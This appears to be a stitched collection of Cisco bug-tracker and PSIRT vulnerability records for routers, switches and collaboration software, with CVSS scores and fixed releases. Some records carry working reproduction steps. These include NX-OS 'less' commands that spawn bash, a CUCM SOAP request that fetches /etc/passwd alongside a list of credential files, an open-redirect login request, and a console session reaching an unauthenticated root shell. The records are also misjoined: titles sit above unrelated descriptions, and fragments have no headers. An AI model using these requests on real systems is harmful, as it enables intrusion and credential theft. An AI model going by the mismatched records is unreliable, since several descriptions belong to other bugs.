Title: Cisco IOS XE Software for Cisco ASR 1000 Series Routers Line Card Console Access Vulnerability
RNE: Symptom: An issue in motherboard console ports of Cisco ASR1000 line cards and CBR8 line cards could allow an unauthenticated, physical attacker to gain  access to the underlying operating system of the device.  The issue is due to an engineering console port being made available on the motherboard of the affected line cards. An attacker could exploit this  issue by physically connecting to the console port on the line cards. An exploit could allow the attacker to gain full access to the underlying operation  system of the device.  Cisco has released software updates that address this vulnerability.  Workarounds that mitigate this vulnerability are not available.   This advisory is available at the following link: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170927-cc   This advisory is part of the September 27, 2017, release of the Cisco IOS and IOS XE Software Security Advisory Bundled Publication, which  includes 12 Cisco Security Advisories that describe 13 vulnerabilities. For a complete list of the advisories and links to them, see the '' Cisco Event  Response: September 2017 Semiannual Cisco IOS and IOS XE Software Security Advisory Bundled Publication'' which is available at  http://tools.cisco.com/security/center/viewErp.x?alertId=ERP-63410  Conditions: This vulnerability affects Cisco devices that are running a vulnerable release of a Cisco IOS XE Software. See the published advisory for more  information.  Please see the Cisco IOS XE Software Checker tool for information on non-vulnerable, vulnerable and fixed releases. This tool is available at  http://tools.cisco.com/security/center/selectIOSVersion.x  NOTE: Cisco IOS Software Checker checks for BOTH ASR1K and CBR8 fixes combined.  ASR1K Affected releases: * 3.13S Train. * 3.14S Train. * 3.15S Train. * 3.16S Train. * 3.17S Train. * 3.18S Train. * 3.18SP Train.  No 16.x releases are affected.  First fixed in: * 3.13.6bS * 3.13.7S * 3.16.6S * 3.17.4S * 3.18.3S * 3.18.2aSP * 3.18.3SP  Workaround: See published advisory  Further Problem Description: PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 7.6: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:P/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:X/RL:X/RC:X  CVE ID CVE-2017-12239 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: The ASR1k linecards (CC/FP) come with console ports at the back of the box. This console port can be connected to observe the bootup of the CC/FP and obtain access to the shell for debugging. Since, it was meant to be used by developers only, a simple **** login credential is implemented. However, once you gain root access to the CC using this credential, access to the RP can be obtained without any further authentication. This seems to defeat the authentication required when wishing to access the RP console.Image Info==========josh6ru20#show versionCisco IOS XE Software, Version BLD_MCP_DEV_LATEST_20151212_044902Cisco IOS Software, ASR1000 Software (X86_64_LINUX_IOSD-ADVENTERPRISEK9-M), Experimental Version 15.6(20151212:071751) [mcp_dev-BLD-BLD_MCP_DEV_LATEST_20151212_044902-ios 138]Copyright (c) 1986-2015 by Cisco Systems, Inc.Sample from SIP10 console output================================Starting process management (pvp/pman): [  OK  ]Checking for postdo_start_process_management ... normal.Checking for postplatconfig ... normal./etc/rc3.d/S80binos: line 4798: /usr/binos/conf/issu_comp_check.sh: No such file or directory/etc/rc3.d/S80binos: line 4798: exec: /usr/binos/conf/issu_comp_check.sh: cannot execute: No such file or directorySIP_1 login:Password: [josh6ru20_SIP_1:~]$ telnet RP0-0Trying 10.0.1.0...Connected to RP0-0.Escape character is '^]'.<NO AUTHENTICATION ASKED>Linux 2.6.32.59 (josh6ru20_RP_0) (0)2016/02/01 23:51:08 : <anon>[josh6ru20_RP_0:~]$ uname -aLinux josh6ru20_RP_0 2.6.32.59 #7 SMP Sat Dec 12 02:17:34 PST 2015 x86_64 x86_64 x86_64 GNU/Linux[josh6ru20_RP_0:~]$

Title: Cisco Prime Collaboration Provisioning Directory Traversal Arbitrary File Deletion Vulnerability
RNE: Symptom: A vulnerability in the web interface of Cisco Prime Collaboration Provisioning Software could allow an authenticated, remote attacker to delete any file from an affected system.  The vulnerability exists because the affected software does not perform proper input validation of HTTP requests and fails to apply role-based access controls (RBACs) to requested HTTP URLs. An attacker could exploit this vulnerability  by sending a crafted HTTP request that uses directory traversal techniques to submit a path to a desired file location on an affected system. A successful exploit could allow the attacker to delete any file from the system.  Conditions: Cisco Prime Collaboration Provisioning software versions prior to 12.1 are vulnerable. The first fixed release is 12.1.  Workaround: None.  Further Problem Description: None.  PSIRT Evaluation:  Credit: Cisco would like to thank rgod, working with Trend Micro Zero Day Initiative (ZDI), for finding and reporting this vulnerability.  The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 6.5: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N/E:X/RL:X/RC:X  CVE ID CVE-2017-6635 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: licensestatus Directory Traversal Arbitrary File Deletion VulnerabilityThis is a directory traversal vulnerability that allows an attacker todelete any file or directory on the system. Additionally, there is anauthentication bypass vulnerability that makes it possible for anattacker to do this without any authentication.See PoC enclosure for details

Title: Commands Injection Vulnerability in multiple Cisco TelePresence Products
RNE: Symptom: A vulnerability in the web framework of multiple Cisco TelePresence products could allow an authenticated, remote attacker to inject arbitrary commands that are executed with the privileges of the root user.  The vulnerability is due to insufficient input validation. An attacker could exploit this vulnerability by authenticating to the device and submitting crafted input to the affected parameter in a web page. Administrative privileges are required in order to access the affected parameter. A successful exploit could allow an attacker to execute system commands with the privileges of the root user.  Cisco has released free software updates that address this vulnerability. Workarounds that mitigate this vulnerability are not available. This advisory is available at the following link: http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20150513-tp   Conditions: See published Cisco Security Advisory  Workaround: See published Cisco Security Advisory  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS sscores as of the time of evaluation are 9.0/7.4: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:L/Au:S/C:C/I:C/A:C/E:F/RL:OF/RC:C&version=2.0 CVE ID CVE-2015-0713 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Description: There are multiple wired clients on a webauth guest LAN. The wired clients creates TCP session and request for http://2.2.2.1/login.html, but doesn't complete the web authentication. Wired clients does this continuously. The memory keeps depleting and finally WLC crashes with out of memory. No crash/coredump because its out of memory. With 7K clients it hardly takes 30 minutes to crash the box.This can be a potential DOS attackI have forced a crash when system was around 86% memory usage, to get the coredump.

Title: Cisco Unity Connection Cross-Site Request Forgery Vulnerability
RNE: Symptom: A cross-site request forgery (CSRF) vulnerability in Cisco Unity Connection could allow an unauthenticated, remote attacker to execute unwanted actions.  The vulnerability is due to a lack of CSRF protections by an affected device. An attacker could exploit these vulnerabilities by convincing a user to follow a malicious link. A successful exploit could allow the attacker to submit arbitrary requests to the affected device via the web browser with the privileges of the user.  Conditions: A device running an affected version of code.  Workaround: Users should verify that unsolicited links are safe to follow.  Further Problem Description: To exploit this vulnerability, the attacker may provide a link that directs a user to a malicious site and use misleading language or instructions to persuade the user to follow the provided link.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 4.3/4.1: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:N/C:N/I:P/A:N/E:F/RL:U/RC:C&version=2.0  CVE ID CVE-2015-6408 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: Cisco Unity Connection was found to be vulnerable to cross-site request forgery (CSRF).  This means that it would be possible to spoof actions that can be performed by a user of the application.Victims must click a malicious link or visit a malicious webpage while logged in to the vulnerable application for a CSRF attack to succeed. This would cause the victim's browser to issue GET or POST requests to the vulnerable site by means of hidden images or embedded JavaScript code. Exploitation of cross-site scripting vulnerabilities also provides an effective means of delivering a CSRF attack.As the application did not sufficiently validate requests (such as by means of random tokens), it was unable to discern between forged requests and genuine actions performed by the real user clicking on elements within the application.Note that CSRF attacks are effective only if the user being attacked is logged in to the relevant application at the time the request is made. They take advantage of the fact that a user's browser will automatically submit the cookies associated with a particular domain in requests to that domain, regardless of where the request originated. Therefore, the use of session cookies is not a defence against CSRF.
PSIRT: PSIRT-owner: srasovic           PSIRT is reviewing this issue for possible inclusion in a Cisco Security  Advisory which could include this DDTs. Title: Cisco SMA TCP Flood Denial of Service Vulnerability
RNE: Symptom: A vulnerability in the network stack of Cisco AsyncOS for Cisco Email Security Appliance (ESA), Cisco Content Security Management Appliance (SMA) and Cisco Web Security Appliance (WSA) could allow an unauthenticated, remote attacker to exhaust all available memory, preventing the affected device from accepting new TCP connections.  The vulnerability is due to improper handling of TCP packets sent at a high rate. An attacker could exploit this vulnerability by sending crafted TCP packets to the affected system.  Note: A full device reload is needed to recover the system to an operational state.  Cisco has released software updates that address this vulnerability. There are no workarounds that mitigate this vulnerability. This advisory is available at the following link: http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20151104-aos  Conditions: See Security Advisory  Workaround: See Security Advisory  Further Problem Description: PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 7.1/5.9: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:N/C:N/I:N/A:C/E:F/RL:OF/RC:C&version=2.0 CVE ID CVE-2015-6321 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: Tracebacks, Malloc errors with ISM-VPN, very low MTU and without CEF
RNE: Symptom: %SYS-2-MALLOCFAIL, Tracebacks or Cisco VPN Internal Service Module (VPN-ISM) crashes.  Conditions: A Cisco router with a Cisco VPN Internal Service Module installed.  If specific packet flow is passed through the VPN-ISM either: * The VPN-ISM may crash, resulting in the software crypto engine being used. * If CEF is disabled on the router, malloc and tracebacks may be observed.  Workaround: None.  More-Info:  PSIRT Evaluation:  The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are  2.6/2.5:  http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:H/Au:N/C:N/I:N/A:P/E:F/RL:U/RC:C&version=2.0  No CVE ID has been assigned to this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html  Further Problem Description:
Description: Continuous Tracebacks and malloc errors seen with jumbo packets from traffic generator and low MTU on WAN peer GetVPN GM WAN interface. This is with ISM-VPN enabled and CEF disabled. UUT loses BGP routes and data traffic fails eventually. The traffic generator generates 9000 bytes jumbo packets and the ASR GM WAN interface is configured with ;ip mtu 68;. Hence there are lot of fragmented packets.Topo:-------TrafficGen-------UUT(3945)-------MPLS--------ASRGM--------Switch---------TrafficGenTraceback:---------------Traceback= 5B7B474z 73ED828z 73F50E8z 7400194z 4007A5Cz 74064F8z 74066C8z 4E5E62Cz 4E458E8zDecode:-----------bluechips% /router/bin/rsym -z c3900-universalk9-mz.154-0.18.T.symbols.gzAssume all addresses are link-time text addressesUncompressing and reading c3900-universalk9-mz.154-0.18.T.symbols.gz via /router/bin/zcatc3900-universalk9-mz.154-0.18.T.symbols.gz read inEnter hex value: 5B7B474z 73ED828z 73F50E8z 7400194z 4007A5Cz 74064F8z 74066C8z 4E5E62Cz 4E458E8z0x5B7B474:errmsg(0x5b7b3b0)+0xc40x73ED828:report_malloc_failure(0x73ed778)+0xb00x73F50E8:malloc_extended(0x73f4768)+0x9800x7400194:chunk_malloc(0x73ffaf0)+0x6a40x4007A5C:particle_pool_item_create(0x40079ac)+0xb00x74064F8:service_pool(0x7406344)+0x1b40x74066C8:pool_process(0x74065a0)+0x1280x4E5E62C:ppc_process_dispatch(0x4e5e608)+0x240x4E458E8:process_execute(0x4e45730)+0x1b8

Title: NetBios Vulnerabilities in DMM
RNE: Symptoms: Network scan may identify DMM with NetBios vulnerabilities.  Conditions:  Scan reveals DMM runs NetBIOS (Used for CIFS), and potentially has the following vulnerabilities:  Null Session/Password NetBIOS Access: Remote User List Disclosure Using NetBIOS:  Workaround: None.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 7.5/7.1:  http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:L/Au:N/C:P/I:P/A:P/E:F/RL:U/RC:C&version=2.0 CVE ID CVE-1999-0519, CVE-2000-1200 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: Scan reveals DMM runs NetBIOS (Used for CIFS), and potentially has the following vulnerabilities:Null Session/Password NetBIOS Access:THREAT:Unauthorized users can connect to this NetBIOS service without a password.IMPACT:Unauthorized users may be able to exploit this vulnerability to obtain sensitive information about your system resources, such as a list of allaccounts or shared resources on this host. For Windows hosts, unauthorized users may also be able to access the registry, and dependingon the Windows version and registry permission settings, make modifications to the registry.SOLUTION:Null NetBIOS sessions can be disabled using the following methods: Remote User List Disclosure Using NetBIOS:THREAT:A null session connection to the IPC$ share was successful. NetBIOS access can be obtained with any authenticated account on this host.Therefore unauthorized users can steal the remote user list. This kind of attack is commonly exploited by users with weak passwords, suchas the GUEST account.Please note that this QID is posted when QualysGuard is able to enumerate the user-list of a target via the Net* API functions (in which caseQID 70003 isposted as well), or when QualysGuard is able to ;brute-force; known SIDs via LsarLookupSids (in which case only QID 45003 is posted).While both techniques use anonymous NetBIOS sessions, we are unaware of a system-level fix forLsarLookupSids, as Microsoft considersthis to be requisite functionality.IMPACT:By exploiting this vulnerability, unauthorized users can launch brute force password attacks and other intrusive attacks based on collectedinformation. Employee, customer, and partner information may be gathered. Spamming the user list is also possible.SOLUTION:It is recommended that you disable null sessions.
PSIRT: PSIRT-owner: psirt@cisco.com           This issue has been evaluated and driven to closure by PSIRT. Title: LESS allows bash access
RNE: Symptom: Cisco Nexus OS contains a vulnerability that could allow an authenticated, local attacker to execute arbitrary commands on a targeted device. The vulnerability is due to improper sanitization of user-supplied values to command line interface commands.   An authenticated, local attacker could exploit the vulnerability by issuing commands that contain malicious options on the device command line interface. If successful, the attacker could gain elevated privileges on the targeted device.   Conditions:  Injection can be done via either the less or the section sub command.  Full details below:  ---------------------------------------------------------------------- NX-OS - "less" sub-command - Command injection / sanitization issues. ----------------------------------------------------------------------  Affected Products: ==================  The following products are affected by this vulnerability:  +-----------------------------------------------------------------+ | Affected Product                  | Cisco Bug  | First Fixed    | |                                   |     ID     |   Release      | |-----------------------------------+------------+----------------| | Cisco Nexus 7000 Series Switches  | CSCtf40008 | 4.2(6)         | |                                   |            | 5.1(1)         | |-----------------------------------+------------+----------------| | Cisco Nexus 5000 Series Switches  | CSCtf40008 | 4.2(1)N2(1)    | |-----------------------------------+------------+----------------| | Cisco Nexus 2000 Series Switches  | CSCtf40008 | 4.1(1)N2(1)    | |-----------------------------------+------------+----------------| | Cisco Nexus 1000V Series Switches | CSCtf40008 | 4.2(1)SV1(5.1) | |-----------------------------------+------------+----------------| | Cisco MDS 9000 Software           | CSCtf40008 | 4.2(6)         | |                                   |            | 5.1(1)         | |-----------------------------------+------------+----------------| | Cisco Unified Computing System    | CSCtg18363 | 1.3(1c)        | |                                   |            | 1.4(1i)        | +-----------------------------------------------------------------+  The following are not affecfed by the "less" sub-command - command injection vulnerability.  * Cisco Nexus 3000 Series Switches * Cisco Nexus 4000 Series Switches  ------------------------------------------------------------------------- NX-OS - "section" sub-command - Command injection / sanitization issues. -------------------------------------------------------------------------  Affected Products: ==================  The following products are affected by this vulnerability:  +--------------------------------------------------------------+ | Affected Product                  | Cisco Bug  | First Fixed | |                                   |     ID     |   Release   | |-----------------------------------+------------+-------------| | Cisco Nexus 7000 Series Switches  | CSCtr44645 | 5.2(1)      | |-----------------------------------+------------+-------------| | Cisco Nexus 5000 Series Switches  | CSCtr44645 | 5.1(3)N1(1) | |-----------------------------------+------------+-------------| | Cisco Nexus 3000 Series Switches  | CSCts10188 | 5.0(3)U2(1) | |-----------------------------------+------------+-------------| | Cisco Nexus 2000 Series Switches  | CSCtr44645 | 5.1(3)N1(1) | |-----------------------------------+------------+-------------| | Cisco MDS 9000 Software           | CSCtr44645 | 5.2(1)      | |-----------------------------------+------------+-------------| | Cisco Unified Computing System    | CSCtr50762 | 2.0(1m)     | +--------------------------------------------------------------+  The following products are not affected by the "section" sub-command - command injection vulnerability  * Cisco Nexus 1000V Series Switches * Cisco Nexus 4000 Series Switches  PSIRT Evaluation:  The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are:  Nexus Products: AV:L/AC:L/Au:S/C:P/I:P/A:C/E:F/RL:OF/RC:C (5.7/4.7) http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:L/AC:L/Au:S/C:P/I:C/A:C/E:F/RL:OF/RC:C&version=2.0  UCSM: AV:L/AC:L/Au:S/C:C/I:C/A:C/E:F/RL:OF/RC:C (6.8/5.6) http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:L/AC:L/Au:S/C:C/I:C/A:C/E:F/RL:OF/RC:C&version=2.0  CVE ID CVE-2011-2569 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL:  http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: Less command included in NX-OS allows execution of bash commands using | option.This is also documented in our configuration guides.http://www.cisco.com/en/US/docs/switches/datacenter/sw/4_2/nx-os/fundamentals/configuration/guide/Cisco_Nexus_7000_Series_NX-OS_Fundamentals_Configuration_Guide__Release_4.2_chapter4.html#con_1240502{! | :![shelll-cmd]   Executes the command specified in the shell-cmd argument in a subshell.Steps to reproduce:a12-n7k-phil# echo ;; | lessEnter a pipe character.  The prompt will change to:|mark:Press enter, and the prompt will change to:!Enter all your bash commands followed by ;;; then press enter.Commands will execute and you will see |done  (press RETURN).Quit less and you will see the returns for your commands.Ex.:a12-n7k-phil# echo ;; | less!pwd > /bootflash/vdc_2/mylog.txt; whoami >> /bootflash/vdc_2/mylog.txt; id >> /bootflash/vdc_2/mylog.txt; echo $PATH >> /bootflash/vdc_2/mylog.txt; cd /isan/bin; memdump --help >> /bootflash/vdc_2/mylog.txt;|done  (press RETURN)(END) qa12-n7k-phil# show file bootflash:mylog.txt/var/sysmgr/vdc_2/vshadmin#02#uid=2004(admin#02#) gid=504(network-operator)/sbin:/usr/sbin:/isan/bin:/isanboot/bin:/usr/local/bin:/usr/bin:/bin:/usr/bin/X11:/usr/gamesusage:  memdump address range <b|s|w> a12-n7k-phil# More is not affected because the SHELL variable is assigned to NONE, causing execution of sub-shells to fail.
PSIRT: PSIRT-owner: psirt@cisco.com           This issue has been evaluated and driven to closure by PSIRT. Conditions: Device with default configuration.  Workaround: Not currently available.  Further Problem Description: Additional details about the vulnerabilities listed above can be found at http://cve.mitre.org/cve/cve.html.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 7.5: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:X/RL:X/RC:X  CVE ID CVE-2017-5647 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: below CWE vulnerability was reported for apache tomcat and PI uses affected version according to licensing information documentation.CVE-2017-5647 (and similar CWE also there -5648/-5650/-5651)From http://cve.mitre.org/cve/cve.html or https://tools.cisco.com/security/center/viewAlert.x?alertId=53423Description : A bug in the handling of the pipelined requests in Apache Tomcat 9.0.0.M1 to 9.0.0.M18, 8.5.0 to 8.5.12, 8.0.0.RC1 to 8.0.42, 7.0.0 to 7.0.76, and 6.0.0 to 6.0.52, when send file was used, results in the pipelined request being lost when send file processing of the previous request completed. This could result in responses appearing to be sent for the wrong request. For example, a user agent that sent requests A, B and C could see the correct response for request A, the response for request C for request B and no response for request C.

Title: CUCM / Arbitrary file retrieval vulnerability
RNE: Symptom: A vulnerability in the way Cisco Unified Call Manager Software (CUCM) is handling requests for resources to be downloded may allow an authenticated remote attacker to retrieve arbitrary files.  Conditions: Default installation of an affected release of CUCM.  Workaround: None.  Further Problem Description: PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 4/3.8: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:L/Au:S/C:P/I:N/A:N/E:F/RL:U/RC:C&version=2.0  CVE ID CVE-2015-0680 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: The DimeGetFileService web service appeared to be designed for the collection of logs from the server but did not restrict requests to the log directory. Basic authentication as an application user was required by the web service.POST /logcollectionservice/services/DimeGetFileService HTTP/1.1Accept-Encoding: gzip,deflateContent-Type: text/xml;charset=UTF-8SOAPAction: ;http://schemas.cisco.com/ast/soap/action/#LogCollectionPort#GetOneFile;Content-Length: 614Host: 172.30.1.2Connection: Keep-AliveUser-Agent: Apache-HttpClient/4.1.1 (java 1.5)<soapenv:Envelope xmlns:xsi=;http://www.w3.org/2001/XMLSchema-instance;xmlns:xsd=;http://www.w3.org/2001/XMLSchema;xmlns:soapenv=;http://schemas.xmlsoap.org/soap/envelope/;xmlns:soap=;http://schemas.cisco.com/ast/soap/;><soapenv:Header/><soapenv:Body><soap:GetOneFile soapenv:encodingStyle=;http://schemas.xmlsoap.org/soap/encoding/;><FileName xsi:type=;get:FileName;xmlns:get=;http://cisco.com/ccm/serviceability/soap/LogCollection/GetFile/;>/etc/passwd</FileName></soap:GetOneFile></soapenv:Body></soapenv:Envelope>This vulnerability allowed the retrieval of a number of interesting files, including:/etc/passwd showing a list of operating system users and their associated shellsApplication code documented war files could be retrieved and extracted/usr/local/cm/db/ifx.txt Database password for Informix/etc/ssh/sshd_config SSH service configuration showing that port forwarding was disabled/usr/local/thirdparty/jakarta-tomcat/conf/tomcat-users.xml Tomcat credentials/var/log/active/tomcat/logs/catalina.out Logs including session identifiers/proc/self/cmdline, maps, mounts, smaps Execution environment

Title: Security Issue in Apache
RNE: Summary A denial of service vulnerability has been found in the way the multiple overlapping ranges are handled by the Apache HTTPD server. Multiple Cisco products could be affected by this vulnerability.  Mitigations that can be deployed on Cisco devices within the network are available in the Cisco Applied Intelligence companion document for this Advisory: http://tools.cisco.com/security/center/viewAMBAlert.x?alertId=24024  This advisory is posted at http://www.cisco.com/warp/public/707/cisco-sa-20110830-apache.shtml.   PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 7.8/7.8:  http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:L/Au:N/C:N/I:N/A:C/E:H/RL:U/RC:C&version=2.0  CVE ID CVE-2011-3192 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: A vulnerability has been identified that affects the Apache HTTPd Web Server and is identified by CVE Identifier CVE-2011-3192. The issue affects all versions based on the 1.3, 2.0 and 2.2 code bases. The issue could allow an unauthenticated, remote attacker to create a denial of service (DoS) condition on an affected system or device. When exploited the Apache may consume a significant amount of Memory and CPU resources, and fail to respond to future requests.The Apache team plans to release updated software that mitigates this issue for the 2.0 and 2.2 codetrains in the next day or two. The 1.3 codetrain has been deprecated and will not receive an official fix. Additional Information can be obtained from:PSIRT Hotpage:https://psirt.cisco.com/PSIRThot/apache-rangeoverlap-dosApache Advisory: http://mail-archives.apache.org/mod_mbox/httpd-announce/201108.mbox/browserIntelliShield Alert ID 24004: http://tools.cisco.com/security/center/viewAlert.x?alertId=23983Actions Needed:1. Please assign to an engineer for evaluation, as soon as possible2. If the product is affected please patch as appropriate3. If the product is not affected please contact Omar Santos (os@cisco.com) from PSIRT and document why the product is found not to be affected on an enclosure in this CDETS entry.

Title: Cisco TP TC Software SIP Denial of Service Vulnerability

Note: This security advisory does not provide information about the OpenSSL TLS Heartbeat Read Overrun Vulnerability identified by CVE-2014-0160 (also known as Heartbleed).  For additional information on Cisco products affected by the Heartbleed vulnerability, refer to the Cisco Security Advisory available at the following link:  http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140409-heartbleed   Cisco has released free software updates that address these vulnerabilities. Title: High CPU Usage on 3850 running Polaris when it received ipv4 packets with options
RNE: $$IGNORE-PSIRT  CISCO HIGHLY CONFIDENTIAL - CONTROLLED ACCESS  This issue is under review by the Cisco Product Security Incident Response team (PSIRT).  The defect describes a product security vulnerability.  Its contents must be protected from unauthorized disclosure, both internal and external to Cisco.  Do not forward this information to mailing lists or newsgroups.  Documentation writers: it is prohibited to publish this Release-note  Enclosure (RNE) until the content has been approved by PSIRT.  PSIRT may  publish a Security Advisory regarding this defect, and the current text of  this RNE will be replaced with appropriate information.  In the event that  a Security Advisory is not published, PSIRT will replace this text with an  appropriate explanation.  More information on PSIRT is available at http//psirt.cisco.com/.   Cisco's public policy on security vulnerability handling can be reviewed at  http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html. For further information, send a message to psirt@cisco.com.  (poxman-11/30/17)  Symptom: High CPU utilization seeing in 3850 catalyst switches  Conditions: Issue is seen when a vulnerability scan is running on the network and sends all types of malformed packets   - This has been tested in 16.3.1 and 16.3.3 and we are seeing the same issue.  - Issue is not seeing in 03.06.x and 03.07.X  Workaround: When the packet is looped in the CPU , we can proceed doing one of the following steps.  - Reboot the switch - shut down the SVI - Applying a control plane policing  Further Problem Description: After stopping the vulnerability scan one of the packet with source mac and destination the same is looping  in the CPU and still seeing high Usage.
Description: On 3850 running Polaris we are observing high CPU when source and destination at layer is the same , we are not seeing the same behavior in Nova or other platforms.

Title: Cisco Unified Communications Domain Manager Open Redirect Vulnerability
RNE: Symptoms: A vulnerability in the web-based graphical user interface (GUI) of Cisco Unified Communications Domain Manager (CUCDM) could allow an unauthenticated, remote attacker to redirect a user to a malicious web page.  The vulnerability is due to improper input validation of HTTP request parameters by the affected software. An attacker could exploit this vulnerability by submitting a crafted HTTP request to the web interface of the affected software, which could cause the web interface to redirect the request to a malicious web page at a specified URL. This vulnerability is referred to as an open redirect attack and is used in phishing attacks that get users to unknowingly visit malicious sites.  Conditions: Please refer to the security advisory.  Workaround: Please refer to the security advisory.  Further Problem Description: Please refer to the security advisory.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 6.1: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N/E:X/RL:X/RC:X  CVE ID CVE-2017-6670 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: When a user authenticates to the CUCDM application a POST parameter 'destination' determines where to direct the user after a successful login. If this can be set to an arbitrary 3rd party site, the user will be redirected. This site could perform actions such as requesting the users credentials. The following example demonstrates thisPOST /LOGINBVSM HTTP/1.1Host: <cucdmIP>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-GB,en;q=0.5Accept-Encoding: gzip, deflateReferer: https://<cucdmip>/bvsm/Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 82usergroup=&destination=//www.cisco.com&credential_0=<removed>&credential_1=<removed>
PSIRT: PSIRT-owner: psirt           PSIRT is reviewing this issue for possible inclusion in a Cisco Security  Advisory which could include this DDTs.  Please do not change the  Release-note Enclosure, as PSIRT will modify it appropriately when this  issue is made public.          Should customers request information regarding this DDTs or appear to be running into this DDTs within their network, please bring it to the immediate attention of the Cisco PSIRT at psirt@cisco.com.

Description: FI6296s running UCS Manager 2.2(7b), these FIs are regularly scanned by Nessus vulnerability scanner.Recently, customercome across multiple Apache vulnerabilities. Cisco security alert for this is given below (Alert ID: 52187):;Apache HTTP Server mod_session_crypto Information Disclosure Vulnerability;The Apache Software Foundation has released a security advisory at the following link: https://www.apache.org/dist/httpd/Announcement2.4.htmlAs per this advisory, the Apache HTTP Server version 2.4.25.This fix also addresses the security defects which the Nessus vulnerability scanner is reporting.----------------------------------------------------------------------------------CVE-2016-0736 mod_session_crypto: Authenticate the session data/cookie with a MAC (SipHash) to prevent deciphering or tampering with a padding oracle attack.CVE-2016-2161 mod_auth_digest: Prevent segfaults during client entry allocation when the shared memory space is exhausted.CVE-2016-5387 core: Mitigate [f]cgi ;httpoxy; issues.CVE-2016-8740 mod_http2: Mitigate DoS memory exhaustion via endless CONTINUATION frames.CVE-2016-8743 Enforce HTTP request grammar corresponding to RFC7230 for request lines and request headers, to prevent response splitting and cache pollution by malicious clients or downstream proxies.

Title: Cisco IOS Software Network Address Translation Denial of Service Vulnerability
